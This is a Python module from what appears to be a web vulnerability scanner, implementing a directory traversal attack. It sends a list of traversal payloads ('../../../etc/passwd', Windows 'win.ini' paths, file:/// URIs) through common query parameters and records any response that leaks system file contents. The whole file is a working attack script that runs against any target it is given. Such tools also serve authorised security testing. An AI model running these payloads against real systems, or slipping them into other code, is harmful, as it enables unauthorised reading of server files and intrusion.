#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from core.logger import log_info, log_success
from modules.core.http_client import HTTPClient


class DirTraversal:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=15, retries=3, verbose=verbose)
        self.found = []

        self.payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini",
        ]

    def test_payload(self, param, payload):
        """Test a payload on a parameter"""
        test_url = f"{self.target}?{param}={payload}"
        resp = self.client.get(test_url)
        if resp and resp.status_code == 200:
            if (
                "root:" in resp.text
                or "Windows" in resp.text
                or "Microsoft" in resp.text
            ):
                self.found.append(
                    {
                        "param": param,
                        "payload": payload,
                        "url": test_url,
                        "preview": resp.text[:200],
                    }
                )
                log_success(f"🔥 Found traversal: {test_url}")
                return True
        return False

    def run(self):
        log_info(f"Starting Directory Traversal on: {self.target}")
        params = ["page", "file", "path", "include", "doc", "id"]
        for param in params:
            for payload in self.payloads:
                if self.test_payload(param, payload):
                    break
        log_success(f"Traversal scan completed. Found {len(self.found)} issues.")
        return {
            "target": self.target,
            "scan_type": "dir_traversal",
            "total_found": len(self.found),
            "results": self.found,
        }
